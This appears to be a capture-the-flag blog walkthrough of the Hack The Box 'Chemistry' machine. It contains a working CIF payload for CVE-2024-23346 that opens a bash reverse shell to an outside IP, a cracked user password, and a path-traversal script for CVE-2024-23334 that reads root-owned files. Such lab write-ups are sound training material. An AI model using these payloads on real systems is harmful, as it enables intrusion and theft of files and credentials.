---
title : "Hack The Box - Chemistry"
author: imdang 🤞🤞
date: 2024-10-22 11:33:00 +0800
categories: [Hackthebox, Hackthebox-Linux, Hackthebox-Easy]
tags: [nmap,gobuster,crackstation,CVE-2024-23346,linpeas, CVE-2024-23334,OSCP]
---

<!-- ![image](https://user-images.githubusercontent.com/59029171/139866885-bc8556d4-7979-4d42-9d4e-027c0900f245.png) -->

<!-- **Node is about enumerating an Express NodeJS application to find an API endpoint that discloses the usernames and password hashes. To root the box is a simple buffer overflow and possible by three other unintended ways.** -->

---

# Recon
## Nmap

The first thing that I do is run nmap scan that show this results:
```console
(kali㉿kali)-[~/Desktop]
└─$ nmap -sV -sC --min-rate=1000 -p- 10.10.11.38
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 10:25 EDT
Nmap scan report for 10.10.11.38
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Mon, 21 Oct 2024 14:27:18 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">                                                                             
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">                                                                                                                                                                
|     <title>Chemistry - Home</title>                                                                                                                                                                                                       
|     <link rel="stylesheet" href="/static/styles.css">                                                                                                                                                                                     
|     </head>                                                                                                                                                                                                                               
|     <body>                                                                                                                                                                                                                                
|     <div class="container">                                                                                                                                                                                                               
|     class="title">Chemistry CIF Analyzer</h1>                                                                                                                                                                                             
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>                                                              
|     <div class="buttons">                                                                                                                                                                                                                 
|     <center><a href="/login" class="btn">Login</a>                                                                                                                                                                                        
|     href="/register" class="btn">Register</a></center>                                                                                                                                                                                    
|     </div>                                                                                                                                                                                                                                
|     </div>                                                                                                                                                                                                                                
|     </body>                                                                                                                                                                                                                               
|   RTSPRequest:                                                                                                                                                                                                                            
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"                                                                                                                                                                                     
|     "http://www.w3.org/TR/html4/strict.dtd">                                                                                                                                                                                              
|     <html>                                                  
|     <head>                                                   
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">                                                                                                                                                          
|     <title>Error response</title>                                                                                                                                                                                                         
|     </head>                                                                                                                                                                                                                               
|     <body>                                                                                                                                                                                                                                
|     <h1>Error response</h1>                                                                                                                                                                                                               
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=10/21%Time=671664C4%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
SF:\x20Python/3\.9\.5\r\nDate:\x20Mon,\x2021\x20Oct\x202024\x2014:27:18\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemi
SF:stry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class
SF:=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\"
SF:>Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\
SF:x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20I
SF:nformation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20
SF:contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center
SF:><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">R
SF:egister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\
SF:x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUB
SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20
SF:version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Er
SF:ror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.23 seconds
```
From the nmap results, we can see that there is port 5000 which is a web service that running on the server and on port 22 is SSH.

## Website - TCP 5000

First of all, we can add the IP to our `/etc/host` folder as `chemistry.htb`

```shell
0xStarlight@kali$ sudo nano /etc/host
10.10.11.38 chemistry.htb
```

Upon visiting the site, it looks like upload file website with ```.cif``` format file.

![image]()

The website is asking to upload a ```.cif``` file. After researching, i find a CVE with file ```.cif``` upload with poc in [github repo](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)   

## Cracking CVE-2024-23346

Now with this poc so i create a ```.cif``` file to get a reverse shell. I just copy example data from example file from lab and change the shell to send reverse shell, you should change the IP and port. by 

```"/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.9/1234 0>&1\'"```


```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy


 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.9/1234 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Now that we have ```vuln.cif```, we can upload it and have reverse shell by listening with netcat 

```nc -nvlp 1234```

![image]()

#### We now have a reverse shell

Now we check the user and specify that we must find the credentials of the user ```rosa```

Check some files in the directory, we can see a file ```database.db``` is suspicious. Maybe we can find the credentials of the user in there

![image]()

By reading the database, we can find a table ```user``` has the credentials of all users with hash password and rosa is one of them.

![image]()

Use this hash password in crackstation, so we can find the password of ```rosa``` is ```unicorniosrosados```

#### We now have credentials of rosa and get user flag by using ssh

![image]()

## Privilege Escalation

To start, i upload ```linpeas.sh``` and run. Read the report, i find out that ```Server: Python/3.9 aiohttp/3.9.1```, and with researching, i find poc to exploit ```CVE-2024-23334``` in [github repo](https://github.com/z3rObyte/CVE-2024-23334-PoC)

![image]()

Upload the poc

```
exploit.sh
#!/bin/bash

url="http://localhost:8080"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

Run poc and we can get the root flag. Also we can access to /root/.ssh/id_rsa to get ssh key of root.

![image]()

Connect and WE ARE ROOT !! 

# Box Rooted 

![image]()

<!-- HTB Profile : [ficstkeyfx](https://app.hackthebox.com/profile/244565) -->

If you find my articles interesting, you can buy me a coffee 

<a href="https://www.buymeacoffee.com/0xStarlight"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&emoji=&slug=0xStarlight&button_colour=b86e19&font_colour=ffffff&font_family=Poppins&outline_colour=ffffff&coffee_colour=FFDD00" /></a>
